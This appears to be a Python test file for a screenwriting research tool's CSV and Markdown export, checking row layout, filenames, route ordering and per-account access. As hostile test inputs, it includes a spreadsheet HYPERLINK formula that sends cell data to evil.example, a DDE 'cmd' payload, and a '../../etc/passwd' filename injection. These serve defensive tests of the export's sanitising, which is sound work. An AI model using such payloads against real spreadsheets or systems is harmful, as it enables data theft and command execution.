"""A filed sweep as a spreadsheet, and the ways that goes wrong.

Every cell in this file is either a writer's own scene text or an excerpt from
the open web. Both land in a program that will execute a cell if it is allowed
to, and both contain the punctuation that breaks hand-rolled CSV.
"""

import csv
import io
from unittest import mock

from fastapi.testclient import TestClient

from star import server
from star.exports import (
    COLUMNS,
    ROOM_COLUMNS,
    apply_annotations,
    bible_markdown,
    chain_to_csv,
    csv_filename,
    read_annotations,
    room_to_csv,
    safe_cell,
    sweep_rows,
    sweep_to_csv,
)
from star.store import room_to_document, sweep_to_document
from tests.test_scenes import AUTH, UID, a_store, filed_room
from tests.test_scenes import ROOM as ROOM_ID

SWEEP = {
    "room": {"title": "Doctor Who: Liverpool and Hamburg", "era": "1958-1962"},
    "claims": [
        {
            "text": "Kaiserkeller",
            "claim_type": "geography",
            "verdict": "confirmed",
            "scenes": [13, 17],
            "note": "Music venue at 36 Große Freiheit.",
            "citations": [
                {"url": "https://a.example/k", "title": "Kaiserkeller", "excerpt": "Opened 1959."},
                {"url": "https://b.example/k", "title": "Große Freiheit", "excerpt": "The street."},
            ],
        },
        {
            "text": "Ta.",
            "claim_type": "language",
            "verdict": "unverifiable",
            "scenes": [5],
            "note": "No source named.",
            "citations": [],
        },
    ],
}


def a_sweep(**overrides):
    return sweep_to_document({**SWEEP, **overrides}, "sw1", "2026-08-12T22:00:00Z")


def parsed(text):
    return list(csv.DictReader(io.StringIO(text)))


def test_the_receipt_column_says_yes_no_or_nothing_at_all():
    """Three states, and the blank is the one that matters.

    `no` means the comparison ran and the page repeated nothing of the claim.
    Blank means it was never run — every anachronism, because a receipt carrying
    a date routinely shares no wording with the line it contradicts. Collapsing
    the two would tell a writer sorting this column that every anachronism
    receipt passed a check none of them were given.
    """
    sweep = a_sweep(
        claims=[
            {
                "text": "He was seventeen.",
                "claim_type": "timing",
                "verdict": "confirmed",
                "scenes": [8],
                "citations": [
                    {
                        "url": "https://a.example",
                        "title": "Deported",
                        "excerpt": "he was under 18",
                        "shares_claim_wording": False,
                    }
                ],
            },
            {
                "text": "the Reeperbahn",
                "claim_type": "geography",
                "verdict": "confirmed",
                "scenes": [9],
                "citations": [
                    {
                        "url": "https://b.example",
                        "title": "Reeperbahn",
                        "excerpt": "The Reeperbahn is in St Pauli",
                        "shares_claim_wording": True,
                    }
                ],
            },
            {
                "text": "The Casbah",
                "claim_type": "geography",
                "verdict": "anachronism",
                "scenes": [5],
                "citations": [
                    {
                        "url": "https://c.example",
                        "title": "Casbah",
                        "excerpt": "opened 29 August 1959",
                    }
                ],
            },
        ]
    )
    rows = {row["claim"]: row["source_repeats_claim"] for row in parsed(sweep_to_csv(sweep))}

    assert rows["He was seventeen."] == "no"
    assert rows["the Reeperbahn"] == "yes"
    assert rows["The Casbah"] == "", "the question was never asked of an anachronism"


def test_a_claim_with_two_sources_is_two_rows():
    """Not one row with two urls in a cell.

    A writer opening this wants to filter on a domain, sort by verdict, and
    count how much of a draft rests on one site. A packed cell allows none of
    that.
    """
    rows = parsed(sweep_to_csv(a_sweep()))
    scene13 = [r for r in rows if r["scene"] == "13"]

    assert len(scene13) == 2, "one row per source, within the scene"
    assert [r["source_url"] for r in scene13] == ["https://a.example/k", "https://b.example/k"]
    assert scene13[0]["claim"] == scene13[1]["claim"] == "Kaiserkeller", "sharing their claim"
    assert scene13[0]["verdict"] == "confirmed"


def test_a_claim_the_draft_makes_twice_is_a_row_in_each_scene():
    """THE SPLIT. A packed `13 17` cell cannot answer "what is wrong on page
    17", which is the question a writer opens this file with. The claim is
    written into both scenes, and `scenes` still carries the whole spread so
    the other question — where else does the draft say this — survives it."""
    rows = parsed(sweep_to_csv(a_sweep()))

    assert len(rows) == 5, "Kaiserkeller twice over two sources, plus Ta. once"
    assert [r["scene"] for r in rows] == ["5", "13", "13", "17", "17"], (
        "and in PAGE ORDER, because a script is read in page order and so is "
        "the report about it"
    )
    for row in rows:
        if row["claim"] == "Kaiserkeller":
            assert row["scenes"] == "13 17", "the whole spread, on every one of its rows"


def test_a_claim_the_sweep_could_not_place_keeps_its_row():
    """Empty scene, and last. These are the ones the surface calls "checked but
    could not place"; dropping them here would quietly shrink the file against
    the count printed on the page it came from."""
    document = a_sweep(
        claims=[
            {"text": "Placed", "verdict": "confirmed", "scenes": [2], "citations": []},
            {"text": "Adrift", "verdict": "confirmed", "scenes": [], "citations": []},
        ]
    )
    rows = parsed(sweep_to_csv(document))

    assert [r["claim"] for r in rows] == ["Placed", "Adrift"]
    assert rows[-1]["scene"] == "" and rows[-1]["scenes"] == ""


def test_a_scene_number_that_will_not_parse_does_not_take_the_export_down():
    """This reads a STORED document. A sweep filed by an older shape of
    `sweep.attach` is not something a download gets to crash on."""
    document = a_sweep(
        claims=[{"text": "Odd", "verdict": "confirmed", "scenes": [3, None, "x"], "citations": []}]
    )
    rows = parsed(sweep_to_csv(document))

    assert [r["scene"] for r in rows] == ["3"]


def test_a_claim_nobody_could_answer_still_gets_a_row():
    """It is exactly the row a reader is looking for."""
    rows = parsed(sweep_to_csv(a_sweep()))
    bare = [r for r in rows if r["claim"] == "Ta."]

    assert len(bare) == 1
    assert bare[0]["source_url"] == ""
    assert bare[0]["verdict"] == "unverifiable"


def test_the_header_is_the_shape_the_importer_expects():
    rows = parsed(sweep_to_csv(a_sweep()))
    assert list(rows[0].keys()) == list(COLUMNS)
    assert "sweep_id" in COLUMNS, "so an import can find the sweep it belongs to"
    assert "scenes" in COLUMNS, "and a reader can see which pages to open"
    assert COLUMNS[0] == "scene", "the column a reader sorts and filters on, first"


def test_the_split_does_not_reach_the_import():
    """A claim written into three scenes is three rows carrying one claim text,
    and an import keys on claim text. Several rows for one claim is not new —
    a claim with three sources was always three rows — and the join below is
    the behaviour that already handled it."""
    document = a_sweep()
    rows = list(csv.DictReader(io.StringIO(sweep_to_csv(document))))
    out = io.StringIO()
    writer = csv.DictWriter(out, fieldnames=[*COLUMNS, "writer_note"], lineterminator="\r\n")
    writer.writeheader()
    for row in rows:
        writer.writerow({**row, "writer_note": "cut this" if row["scene"] == "17" else ""})

    annotations, complaints = read_annotations(out.getvalue())
    applied, missing, edits = apply_annotations(document, annotations)

    assert complaints == [] and missing == [] and edits == []
    assert len(applied["claims"]) == 2, "two claims, not five"
    marked_claim = next(c for c in applied["claims"] if c["text"] == "Kaiserkeller")
    assert marked_claim["writer_note"] == "cut this", (
        "written once, from whichever of its scene rows the writer typed in"
    )


def test_a_cell_that_would_run_as_a_formula_is_neutralised():
    """FORMULA INJECTION, and it is not hypothetical.

    Excel and Sheets have both shipped remote data exfiltration through a cell
    beginning `=`. Every cell here is a writer's own line or a page off the
    open web.
    """
    hostile = a_sweep(
        claims=[
            {
                "text": '=HYPERLINK("http://evil.example?x="&A1,"click")',
                "verdict": "confirmed",
                "scenes": [1],
                "citations": [
                    {"url": "https://x.example", "title": "@SUM(1+1)", "excerpt": "-2+3"}
                ],
            }
        ]
    )
    row = parsed(sweep_to_csv(hostile))[0]

    assert row["claim"].startswith("'="), "prefixed rather than stripped"
    assert row["source_title"].startswith("'@")
    assert row["source_excerpt"].startswith("'-")
    assert "HYPERLINK" in row["claim"], (
        "and NOT edited away — this file is read beside the draft it came from, "
        "so a writer's own line has to survive intact"
    )


def test_the_whitespace_that_slips_past_a_naive_prefix_check():
    for dangerous in ("\tSUM(1)", "\r=1+1"):
        assert safe_cell(dangerous).startswith("'"), dangerous
    for safe in ("Kaiserkeller", "1958", "", "a '61 Impala"):
        assert not safe_cell(safe).startswith("'" + safe[:1]) or safe == "", safe


def test_a_claim_full_of_punctuation_survives_the_round_trip():
    """A claim is an exact quotation from a draft. It will contain commas,
    quotes and line breaks, and hand-rolled quoting is how one of them shifts
    every column after it."""
    nasty = 'He said "INT. BUS", then, oddly,\nturned around.'
    document = a_sweep(
        claims=[{"text": nasty, "verdict": "confirmed", "scenes": [3], "citations": []}]
    )

    rows = parsed(sweep_to_csv(document))

    assert len(rows) == 1, "the newline did not become a second row"
    assert rows[0]["claim"] == nasty, "character for character"


def test_the_filename_is_something_a_writer_can_find_again():
    assert csv_filename("Doctor Who: Liverpool and Hamburg", "2026-08-12T22:00:00Z") == (
        "doctor-who-liverpool-and-hamburg-sweep-2026-08-12.csv"
    )
    assert csv_filename("", "") == "sweep-undated.csv"
    assert "/" not in csv_filename("A/B: C", "2026-08-12")


def test_two_sweeps_of_one_room_on_one_day_do_not_share_a_filename():
    """THE THIRD SWEEP IS THE ORDINARY CASE, not the edge. A writer sweeping a
    draft, fixing three lines and sweeping again has two files, and this used to
    hand both the same name — leaving the browser to disambiguate them as `(1)`
    and `(2)`, which orders by download time and says nothing about what is
    inside. Measured 2026-08-13: three same-named downloads, and the writer
    imported one into the wrong sweep.

    The id goes LAST so the name still sorts and reads by room and day."""
    first = csv_filename("Doctor Who", "2026-08-13T11:41:00Z", unique="f1d31518e372")
    second = csv_filename("Doctor Who", "2026-08-13T13:35:00Z", unique="26881297a20d")

    assert first == "doctor-who-sweep-2026-08-13-f1d31518e372.csv"
    assert first != second
    assert second.startswith("doctor-who-sweep-2026-08-13-")


def test_the_same_sweep_twice_is_the_same_file():
    """A collision that SHOULD happen. Two exports of one sweep are the same
    bytes, and a writer downloading twice wants one file, not a numbered pair."""
    args = ("Doctor Who", "2026-08-13T13:35:00Z")

    assert csv_filename(*args, unique="26881297a20d") == csv_filename(
        *args, unique="26881297a20d"
    )


def test_an_id_cannot_escape_the_filename():
    """This reaches a Content-Disposition header and a filesystem. An id is
    only alphanumeric by convention, and nothing upstream promises it."""
    nasty = csv_filename("Room", "2026-08-13", unique='../../etc/passwd"; drop')

    assert "/" not in nasty and ".." not in nasty and '"' not in nasty
    assert nasty.endswith(".csv")


def test_a_room_export_still_has_no_id_in_its_name():
    """Rooms do not collide the same way — a room exported twice on one day is
    the same room and the two files agree. Passing nothing must change nothing,
    or every research download in the wild gets a new name for no reason."""
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z", kind="research") == (
        "liverpool-research-2026-08-13.csv"
    )


def test_rows_are_pure_and_do_not_touch_the_document():
    document = a_sweep()
    before = str(document)
    sweep_rows(document)
    assert str(document) == before


def test_the_download_is_a_file_and_not_a_page():
    """`text/csv` with an attachment disposition, never something a browser
    might render — a content type it can render is one it can execute."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())
    store.save_sweep(UID, ROOM_ID, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 200, (
        "and the route is reachable at all: registered ABOVE /sweeps/{sweep_id}, "
        "which matches in declaration order and otherwise swallows `sw1.csv`"
    )
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment" in response.headers["content-disposition"]
    assert "doctor-who" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "Kaiserkeller" in response.text


def test_another_accounts_sweep_has_no_csv_either():
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())
    store.save_sweep(UID, ROOM_ID, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 404


# -- the ROOM, which is a different question from a sweep --------------------


ROOM = {
    "created_at": "2026-08-10T00:00:00Z",
    "story_profile": {"title": "Doctor Who Special: Liverpool", "era": "1958-1962"},
    "categories": {
        "setting": {
            "findings": [
                {
                    "fact": "Mona Best opened the Casbah on 29 August 1959.",
                    "citations": [
                        {
                            "url": "https://casbah.example",
                            "title": "The Casbah",
                            "excerpt": "A six-room cellar in West Derby.",
                        },
                        {"url": "https://second.example", "title": "Also", "excerpt": "Again."},
                    ],
                }
            ]
        },
        "logistics": {
            "findings": [
                {
                    "fact": "Night trams ran on reduced headways.",
                    "citations": [],
                },
                {
                    "fact": "A pint cost about two shillings.",
                    "citations": [{"url": "https://prices.example", "title": "P", "excerpt": "2s"}],
                    "requisition": "what did a pint cost in 1958",
                    "retrieved_at": "2026-08-13T04:00:00Z",
                },
            ]
        },
    },
}


def test_a_room_exports_its_research_rather_than_a_drafts_answers():
    """The question a writer actually asked. A sweep says what a draft claimed
    and how it held up; this says what the department FOUND, and it exists
    without anybody having swept a screenplay."""
    rows = parsed(room_to_csv(ROOM, "room-1"))

    assert list(rows[0].keys()) == list(ROOM_COLUMNS)
    assert len(rows) == 4, "two sources on one finding, plus two more findings"
    assert {r["drawer"] for r in rows} == {"setting", "logistics"}
    assert rows[0]["room"] == "Doctor Who Special: Liverpool"
    assert rows[0]["era"] == "1958-1962"
    assert rows[0]["run_id"] == "room-1"


def test_a_finding_nobody_could_cite_still_gets_a_row():
    rows = parsed(room_to_csv(ROOM))
    bare = [r for r in rows if r["fact"].startswith("Night trams")]

    assert len(bare) == 1
    assert bare[0]["source_url"] == "", (
        "a fact with no source is exactly the row worth finding in a spreadsheet"
    )


def test_a_requisitioned_finding_carries_its_question_and_its_own_date():
    """The rule web/clip.js applies to the RET stamp, in a column somebody will
    sort by: a finding asked for after the build was retrieved when it was
    asked for, and stamping the room's date on it would be a fabricated
    provenance claim."""
    rows = parsed(room_to_csv(ROOM))
    asked = next(r for r in rows if r["fact"].startswith("A pint"))
    built = next(r for r in rows if r["fact"].startswith("Mona Best"))

    assert asked["requisition"] == "what did a pint cost in 1958"
    assert asked["retrieved_at"] == "2026-08-13T04:00:00Z"
    assert built["requisition"] == "", "and the build's own findings carry none"
    assert built["retrieved_at"] == "2026-08-10T00:00:00Z", "they take the room's date"


def test_a_room_export_is_not_a_program_either():
    hostile = {
        "story_profile": {"title": "X"},
        "categories": {
            "setting": {
                "findings": [
                    {
                        "fact": "=cmd|'/c calc'!A1",
                        "citations": [{"url": "https://x.example", "title": "@x", "excerpt": "-1"}],
                    }
                ]
            }
        },
    }
    row = parsed(room_to_csv(hostile))[0]

    assert row["fact"].startswith("'=")
    assert row["source_title"].startswith("'@")
    assert row["source_excerpt"].startswith("'-")


def test_a_room_and_a_sweep_are_told_apart_in_a_downloads_folder():
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z", kind="research") == (
        "liverpool-research-2026-08-13.csv"
    )
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z") == (
        "liverpool-sweep-2026-08-13.csv"
    )


def test_the_room_download_is_reachable_and_is_a_file():
    """Registered ABOVE `/api/rooms/{run_id}`, which matches in declaration
    order and would otherwise claim `abc.csv` — the exact bug the sweep CSV
    shipped with, under a comment claiming it had been avoided."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.csv", headers=AUTH)

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment" in response.headers["content-disposition"]
    assert "research" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "Impala" in response.text, "the room's own finding is in it"


# -- the BIBLE, which is a document and leaves as one -------------------------


def test_the_bible_leaves_as_a_file_that_says_which_room_it_came_from():
    """A document that arrives in somebody's inbox with no idea which room it
    came from is a document they cannot check."""
    room = {**ROOM, "research_bible": "## Setting\n\nLiverpool, 1958.\n", "source_count": 74}
    text = bible_markdown(room, "room-1")

    assert text.startswith("# Doctor Who Special: Liverpool\n")
    assert "1958-1962" in text and "filed 2026-08-10" in text and "74 sources" in text
    assert "room-1" in text
    assert "## Setting\n\nLiverpool, 1958." in text, "and the document itself, unedited"


def test_a_room_with_no_bible_produces_nothing_rather_than_a_masthead():
    """A room can file four drawers and no bible — an interrupted synthesis.
    A masthead over an empty page reads as a bible that says nothing."""
    assert bible_markdown({**ROOM, "research_bible": "   "}) == ""
    assert bible_markdown({}) == ""
    assert bible_markdown(None) == ""


def test_the_bible_download_is_reachable_and_is_a_file():
    """Registered ABOVE `/api/rooms/{run_id}` for the third time in this
    codebase, which is where that route would otherwise claim `abc.md`."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.md", headers=AUTH)

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/markdown")
    assert "attachment" in response.headers["content-disposition"]
    assert ".md" in response.headers["content-disposition"]
    assert "bible" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "# Bible" in response.text, "the room's own document"


def test_a_room_with_no_bible_refuses_the_download_with_the_reason():
    store, _ = a_store()
    store.save(UID, ROOM_ID, {**filed_room(), "research_bible": ""})

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.md", headers=AUTH)

    assert response.status_code == 404
    assert "no bible" in response.json()["detail"]


def test_another_accounts_bible_does_not_download():
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.md", headers=AUTH)

    assert response.status_code == 404


def test_a_bible_and_a_research_file_are_told_apart_in_a_downloads_folder():
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z", kind="bible", ext="md") == (
        "liverpool-bible-2026-08-13.md"
    )
    assert csv_filename("Liverpool", "2026-08-13T00:00:00Z", kind="research") == (
        "liverpool-research-2026-08-13.csv"
    ), "and the default is still csv"


def test_another_accounts_room_has_no_csv():
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(f"/api/rooms/{ROOM_ID}.csv", headers=AUTH)

    assert response.status_code == 404


# -- the CHAIN, which is the same file widened -------------------------------


HAMBURG = {
    "created_at": "2026-08-11T00:00:00Z",
    "story_profile": {"title": "Hamburg", "era": "1960-1962"},
    "categories": {
        "setting": {
            "findings": [
                {
                    "fact": "The Kaiserkeller opened in 1959.",
                    "citations": [{"url": "https://k.example", "title": "K", "excerpt": "1959."}],
                }
            ]
        }
    },
}


def test_a_chain_is_every_rooms_research_in_one_file():
    rows = parsed(chain_to_csv([("hamburg-1", HAMBURG), ("room-1", ROOM)]))

    assert len(rows) == 1 + 4, "Hamburg's one finding, then Liverpool's four rows"
    assert rows[0]["room"] == "Hamburg", "nearest first — the room the reader opened"
    assert rows[0]["run_id"] == "hamburg-1"
    assert {r["room"] for r in rows[1:]} == {"Doctor Who Special: Liverpool"}


def test_the_wide_file_sorts_back_down_into_the_narrow_one():
    """THE WHOLE ARGUMENT FOR OFFERING THIS AT ALL.

    Merging rooms is only safe if a reader can still tell whose research is
    whose — a writer's own findings becoming indistinguishable from the room
    they follow is the thing room_to_csv stays narrow to prevent. Filtering the
    chain file on one room has to give back that room's file exactly.
    """
    chained = parsed(chain_to_csv([("hamburg-1", HAMBURG), ("room-1", ROOM)]))
    alone = parsed(room_to_csv(ROOM, "room-1"))

    assert [r for r in chained if r["run_id"] == "room-1"] == alone


def test_two_rooms_citing_one_page_are_two_rows():
    """Not deduplicated. A source doing double duty across a chain is a fact
    about the research, and collapsing the second row hides it."""
    shared = {
        "story_profile": {"title": "Second room"},
        "categories": {
            "setting": {
                "findings": [
                    {
                        "fact": "Also the Kaiserkeller.",
                        "citations": [
                            {"url": "https://k.example", "title": "K", "excerpt": "1959."}
                        ],
                    }
                ]
            }
        },
    }
    rows = parsed(chain_to_csv([("a", HAMBURG), ("b", shared)]))
    same = [r for r in rows if r["source_url"] == "https://k.example"]

    assert len(same) == 2
    assert {r["room"] for r in same} == {"Hamburg", "Second room"}


def test_an_empty_chain_is_still_a_readable_file():
    assert parsed(chain_to_csv([])) == []
    assert chain_to_csv([]).startswith("drawer,"), "a header, not an empty file"
    assert chain_to_csv(None).startswith("drawer,")


def test_a_chain_export_is_not_a_program_either():
    hostile = {
        "story_profile": {"title": "X"},
        "categories": {"setting": {"findings": [{"fact": "=1+1", "citations": []}]}},
    }
    assert parsed(chain_to_csv([("x", hostile)]))[0]["fact"].startswith("'=")


def a_chain_store():
    """Liverpool following Hamburg, both filed to one account."""
    store, _ = a_store()
    near = filed_room()
    near["continues"] = "far-1"
    store.save(UID, ROOM_ID, near)
    far = room_to_document(
        "far-1",
        {
            "story_profile": {"title": "Hamburg", "era": "1960-1962"},
            "categories": {
                "setting": {
                    "findings": [
                        {
                            "fact": "The Kaiserkeller opened in 1959.",
                            "citations": [
                                {"url": "https://k.example", "title": "K", "excerpt": "1959."}
                            ],
                        }
                    ]
                }
            },
        },
        "complete",
        "2026-08-09T00:00:00+00:00",
    )
    store.save(UID, "far-1", far)
    return store


def test_the_flag_widens_the_download_to_the_rooms_it_follows():
    store = a_chain_store()

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        client = TestClient(server.app)
        narrow = client.get(f"/api/rooms/{ROOM_ID}.csv", headers=AUTH)
        wide = client.get(f"/api/rooms/{ROOM_ID}.csv?chain=true", headers=AUTH)

    assert narrow.status_code == wide.status_code == 200
    assert "Impala" in narrow.text and "Kaiserkeller" not in narrow.text, (
        "the default is still this room only — widening is asked for, not handed over"
    )
    assert "Impala" in wide.text and "Kaiserkeller" in wide.text
    assert "story" in wide.headers["content-disposition"], (
        "and it is named as a different file, so two downloads do not collide"
    )
    assert "research" in narrow.headers["content-disposition"]


def test_a_room_that_starts_a_story_asks_for_a_chain_and_gets_itself():
    """Named `research`, not `story`. A chain of one is a room, and a file
    called story-... promising rooms it does not hold is worse than the flag
    quietly doing nothing."""
    store, _ = a_store()
    store.save(UID, ROOM_ID, filed_room())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}.csv?chain=true", headers=AUTH
        )

    assert response.status_code == 200
    assert "research" in response.headers["content-disposition"]
    assert "story" not in response.headers["content-disposition"]


def test_a_chain_download_reaches_no_room_this_account_cannot_see():
    """A `continues` pointing at SOMEBODY ELSE'S room ends the walk instead of
    crossing into their research.

    The room ids are a writer's own field, so this is reachable by typing one:
    point a room at a run id belonging to another account and ask for the
    chain. The reads are uid-scoped by path, so the far room is simply not
    there — and the file that comes back holds one room and is named for one.
    """
    store, _ = a_store()
    near = filed_room()
    near["continues"] = "far-1"
    store.save(UID, ROOM_ID, near)
    store.save("somebody-else", "far-1", room_to_document(
        "far-1",
        {
            "story_profile": {"title": "Hamburg"},
            "categories": {
                "setting": {"findings": [{"fact": "The Kaiserkeller.", "citations": []}]}
            },
        },
        "complete",
        "2026-08-09T00:00:00+00:00",
    ))

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM_ID}.csv?chain=true", headers=AUTH
        )

    assert response.status_code == 200
    assert "Impala" in response.text
    assert "Kaiserkeller" not in response.text, "the other account's room is not in the file"
    assert "research" in response.headers["content-disposition"]
